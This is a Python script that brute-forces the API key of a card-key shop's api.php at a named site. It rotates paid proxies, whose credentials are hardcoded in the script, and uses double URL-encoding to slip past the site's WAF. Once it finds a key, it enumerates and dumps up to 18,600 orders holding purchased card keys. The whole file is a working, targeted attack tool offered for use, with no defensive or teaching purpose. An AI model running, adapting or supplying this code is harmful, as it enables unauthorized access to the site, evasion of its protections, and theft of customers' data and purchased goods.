#!/usr/bin/env python3
"""Faka %61pi.php API key brute — requests pool + per-worker proxy."""
import fcntl
import json
import os
import subprocess
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

import requests
import urllib3
from requests.adapters import HTTPAdapter

urllib3.disable_warnings()

BASE = os.environ.get("FAKA_BASE", "https://fffzz.lol/shop/")
if not BASE.endswith("/"):
    BASE += "/"
# curl keeps %61pi.php; requests needs double-encoding to avoid WAF decode
API_CURL = BASE + "%61pi.php"
API_REQ = BASE + "%2561pi.php"


def api_path():
    return API_CURL if DIRECT else API_REQ
OUT = Path(sys.argv[6]) if len(sys.argv) > 6 else Path(os.environ.get("FAKA_OUT", "/workspace/results/fffzz.lol/kami_allin_20260717"))
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / f".cookies_api_w{int(sys.argv[5]) if len(sys.argv) > 5 else 0}")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "KAMI_HIT.jsonl"
FOUND_KEY = OUT / "API_KEY_FOUND.txt"
PROGRESS = OUT / "api_brute_progress.json"
PROGRESS_LOCK = OUT / ".progress.lock"
LOCK = threading.Lock()
WID = int(sys.argv[5]) if len(sys.argv) > 5 else 0
LOG = open(OUT / f"api_brute_w{WID}.log", "a", buffering=1)
QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
PROXY = ""
PROXY_AT = 0
PROXY_VER = 0
REQ_N = 0
TURBO = bool(os.environ.get("FFFZZ_TURBO"))
DIRECT = bool(os.environ.get("FAKA_DIRECT"))
CURL_TIMEOUT = os.environ.get("FFFZZ_TIMEOUT", "3" if TURBO else "8")
FAST_KEY = bool(os.environ.get("FAKA_FAST_KEY", "1" if TURBO else ""))
BATCH_SIZE = int(os.environ.get("FAKA_BATCH", "8000" if TURBO else "800"))
TAIL_SKIP = int(os.environ.get("FAKA_TAIL_SKIP", "10000"))
_thread_local = threading.local()


def log(msg):
    with LOCK:
        line = f"[{datetime.now().strftime('%H:%M:%S')}] w{WID} {msg}"
        print(line, flush=True)
        LOG.write(line + "\n")


def is_waf(body):
    if not body:
        return True
    b = body.lower()
    return any(x in b for x in (
        "_guard/html.js", "slider_html", "cf-chl", "just a moment", "access denied",
        "404 not found", "<!doctype html", "cloudflare",
    ))


def is_auth_prompt(body):
    return body and "请提供用户登录信息或API对接密钥" in body


def is_success(body):
    if not body or is_waf(body) or is_auth_prompt(body):
        return False
    if '"code":0' in body:
        return True
    return any(x in body for x in ("kminfo", "卡密", "订单结果", "----"))


def proxy_slot():
    return WID % 20 if WID >= 20 else WID


def bump_proxy():
    global PROXY_VER
    PROXY_VER += 1
    if hasattr(_thread_local, "session"):
        del _thread_local.session
        del _thread_local.proxy_ver


def fetch_proxy():
    global PROXY, PROXY_AT
    pf = OUT / f"proxy_w{proxy_slot()}.txt"
    if pf.exists():
        new = pf.read_text().strip()
        if new:
            if new != PROXY:
                PROXY = new
                PROXY_AT = pf.stat().st_mtime
                bump_proxy()
            return True
    urls = [
        f"https://share.proxy.qg.net/query?key={QG_KEY}&pwd={QG_PWD}",
        f"https://share.proxy.qg.net/get?key={QG_KEY}&pwd={QG_PWD}&num=1&distinct=true",
        f"https://share.proxy.qg.net/pool?key={QG_KEY}&pwd={QG_PWD}",
    ]
    for url in urls:
        try:
            raw = subprocess.run(
                ["curl", "-sS", "--max-time", "12", url],
                capture_output=True, text=True, timeout=15,
            ).stdout or ""
            data = json.loads(raw)
            if data.get("code") != "SUCCESS" or not data.get("data"):
                continue
            server = data["data"][0]["server"]
            PROXY = f"http://{QG_KEY}:{QG_PWD}@{server}"
            PROXY_AT = time.time()
            pf.write_text(PROXY)
            bump_proxy()
            return True
        except Exception:
            continue
    return False


def ensure_proxy():
    global PROXY, PROXY_AT
    pf = OUT / f"proxy_w{proxy_slot()}.txt"
    if pf.exists():
        new = pf.read_text().strip()
        if new:
            if new != PROXY:
                PROXY = new
                PROXY_AT = pf.stat().st_mtime
                bump_proxy()
            else:
                PROXY = new
                PROXY_AT = pf.stat().st_mtime
            return
    shared = Path("/data/config/proxy.env")
    if shared.exists():
        for line in shared.read_text().splitlines():
            if line.startswith("PROXY_URL="):
                new = line.split("=", 1)[1].strip().strip('"')
                if new != PROXY:
                    PROXY = new
                    PROXY_AT = shared.stat().st_mtime
                    bump_proxy()
                return
    if not PROXY or time.time() - PROXY_AT > 140:
        fetch_proxy()


def get_session():
    if getattr(_thread_local, "proxy_ver", -1) != PROXY_VER:
        s = requests.Session()
        s.headers.update({
            "User-Agent": UA,
            "Referer": BASE,
            "X-Requested-With": "XMLHttpRequest",
        })
        adapter = HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0)
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        if PROXY:
            s.proxies = {"http": PROXY, "https": PROXY}
        _thread_local.session = s
        _thread_local.proxy_ver = PROXY_VER
    return _thread_local.session


def http_get(url, retry=None):
    global REQ_N
    retry = 1 if retry is None and TURBO else (retry if retry is not None else 2)
    REQ_N += 1
    if DIRECT:
        url = url.replace("%2561pi.php", "%61pi.php")
        cmd = ["curl", "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
               "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
        for attempt in range(retry):
            try:
                body = subprocess.run(
                    cmd, capture_output=True, text=True, timeout=int(CURL_TIMEOUT) + 2,
                ).stdout or ""
                if is_auth_prompt(body) or is_success(body):
                    return body
            except Exception:
                time.sleep(0.05)
        return ""
    if REQ_N % 300 == 1 or not PROXY:
        ensure_proxy()
    timeout = float(CURL_TIMEOUT)
    for attempt in range(retry):
        try:
            sess = get_session()
            if PROXY:
                sess.proxies = {"http": PROXY, "https": PROXY}
            r = sess.get(url, timeout=timeout, verify=False)
            body = r.text or ""
            if is_auth_prompt(body) or is_success(body):
                return body
            if (not body.strip() or is_waf(body)) and attempt + 1 >= retry:
                fetch_proxy()
        except Exception:
            fetch_proxy()
            if attempt + 1 < retry:
                time.sleep(0.05)
    return ""


def wait_for_site():
    global PROXY, PROXY_AT
    attempts = 0
    while True:
        attempts += 1
        if not DIRECT:
            ensure_proxy()
        mode = "direct" if DIRECT else (PROXY.split("@")[-1] if PROXY else "none")
        log(f"probe {mode}")
        http_get(BASE, retry=1)
        body = http_get(f"{api_path()}/?act=search&id=1", retry=3)
        if is_auth_prompt(body) or is_success(body):
            log(f"site up {body[:80]}")
            return
        if DIRECT:
            wait = 2
        else:
            alt = OUT / f"proxy_w{(proxy_slot() + attempts) % 20}.txt"
            if alt.exists():
                PROXY = alt.read_text().strip()
                PROXY_AT = alt.stat().st_mtime
                bump_proxy()
            else:
                fetch_proxy()
            wait = 3 if TURBO else 15
        log(f"site down, retry {wait}s (attempt {attempts})")
        time.sleep(wait)


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {}


def save_progress(offset, tested, rate=0):
    PROGRESS_LOCK.parent.mkdir(parents=True, exist_ok=True)
    PROGRESS_LOCK.touch(exist_ok=True)
    with open(PROGRESS_LOCK, "r+") as lk:
        fcntl.flock(lk, fcntl.LOCK_EX)
        try:
            data = load_progress()
            data[str(WID)] = {
                "offset": offset, "tested": tested,
                "rate": round(rate, 1),
                "ts": datetime.now().isoformat(),
            }
            PROGRESS.write_text(json.dumps(data, indent=2))
        finally:
            fcntl.flock(lk, fcntl.LOCK_UN)


def try_key(key):
    body = http_get(f"{api_path()}/?act=search&id=1&key={quote(key, safe='')}")
    if is_success(body):
        return "key", key, body
    if not FAST_KEY and body and not is_auth_prompt(body) and not is_waf(body):
        for param in ("api_key", "token", "apikey"):
            body2 = http_get(f"{api_path()}/?act=search&id=1&{param}={quote(key, safe='')}")
            if is_success(body2):
                return param, key, body2
    return None


def dump_orders(api_key, param="key", max_id=18600, workers=20):
    log(f"DUMP {param}={api_key[:20]}")
    results = []

    def fetch(oid):
        body = http_get(f"{api_path()}/?act=search&id={oid}&{param}={quote(api_key, safe='')}")
        return (oid, body) if is_success(body) else None

    with ThreadPoolExecutor(workers) as ex:
        futs = {ex.submit(fetch, i): i for i in range(1, max_id + 1)}
        for i, f in enumerate(as_completed(futs), 1):
            r = f.result()
            if r:
                oid, body = r
                results.append({"id": oid, "body": body})
                with LOCK:
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "api_dump", "id": oid, "resp": body[:2000]}, ensure_ascii=False) + "\n")
            if i % 2000 == 0:
                log(f"dump {i}/{max_id} hits={len(results)}")
    (OUT / f"api_orders_dump_w{WID}.json").write_text(json.dumps(results, ensure_ascii=False, indent=2))
    log(f"DUMP done {len(results)}")


def _iter_batches_enumerate(wl, start, limit, batch_size):
    batch, pos = [], start
    with wl.open(encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            if i < start:
                continue
            if limit and i >= start + limit:
                break
            k = line.strip()
            if not (1 <= len(k) <= 128):
                continue
            batch.append(k)
            pos = i + 1
            if len(batch) >= batch_size:
                yield pos, batch
                batch = []
    if batch:
        yield pos, batch


def _iter_batches_tail(wl, start, limit, batch_size):
    cmd = ["tail", "-n", f"+{start + 1}", str(wl)]
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True, bufsize=1 << 20)
    batch, pos, read = [], start, 0
    try:
        for line in proc.stdout:
            if limit and read >= limit:
                break
            read += 1
            k = line.strip()
            pos = start + read
            if not (1 <= len(k) <= 128):
                continue
            batch.append(k)
            if len(batch) >= batch_size:
                yield pos, batch
                batch = []
    finally:
        proc.stdout.close()
        proc.wait()
    if batch:
        yield pos, batch


def iter_key_batches(wl, start, limit, batch_size=None):
    batch_size = batch_size or BATCH_SIZE
    if start >= TAIL_SKIP:
        yield from _iter_batches_tail(wl, start, limit, batch_size)
    else:
        yield from _iter_batches_enumerate(wl, start, limit, batch_size)


def main():
    wl = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/data/wordlists/faka/faka-tokens.txt")
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    limit = int(sys.argv[3]) if len(sys.argv) > 3 else 0
    workers = int(sys.argv[4]) if len(sys.argv) > 4 else 10

    prog = load_progress()
    tested = 0
    if str(WID) in prog:
        p = prog[str(WID)]
        saved = p.get("offset", 0)
        if saved >= start and (not limit or saved < start + limit):
            start = saved
            tested = p.get("tested", 0)
            log(f"resume offset={start} tested={tested}")

    if not DIRECT:
        fetch_proxy()
        ensure_proxy()
    log(f"proxy {'direct' if DIRECT else (PROXY.split('@')[-1] if PROXY else 'none')} turbo={TURBO} threads={workers} batch={BATCH_SIZE} timeout={CURL_TIMEOUT}")
    wait_for_site()

    t0 = time.time()
    log(f"FAST brute start={start} limit={limit or 'all'} threads={workers}")

    if WID == 0 and start == 0:
        quick = os.environ.get(
            "FAKA_QUICK",
            "kln166,KLN166,kulinan,kln166top,admin,123456,api,fffzz,fffzzlol",
        ).split(",")
        for k in quick:
            r = try_key(k)
            if r:
                param, key, body = r
                FOUND_KEY.write_text(f"{param}={key}\n{body[:500]}")
                log(f"*** FOUND {param}={key}")
                dump_orders(key, param)
                return

    pos = start
    for end_pos, batch in iter_key_batches(wl, start, limit):
        with ThreadPoolExecutor(min(workers, len(batch))) as ex:
            futs = {ex.submit(try_key, k): k for k in batch}
            for f in as_completed(futs):
                tested += 1
                r = f.result()
                if r:
                    param, key, body = r
                    FOUND_KEY.write_text(f"w{WID} {param}={key}\n{body[:500]}")
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "api_key_found", "worker": WID, "param": param, "key": key, "resp": body[:500]}, ensure_ascii=False) + "\n")
                    log(f"*** API KEY FOUND {param}={key} {body[:200]}")
                    save_progress(end_pos, tested)
                    dump_orders(key, param)
                    return
        pos = end_pos
        elapsed = time.time() - t0
        rate = tested / elapsed if elapsed > 0 else 0
        save_progress(pos, tested, rate)
        log(f"progress offset={pos} tested={tested} rate={rate:.1f}/s")

    save_progress(pos, tested)
    log("chunk done no hit")


if __name__ == "__main__":
    main()
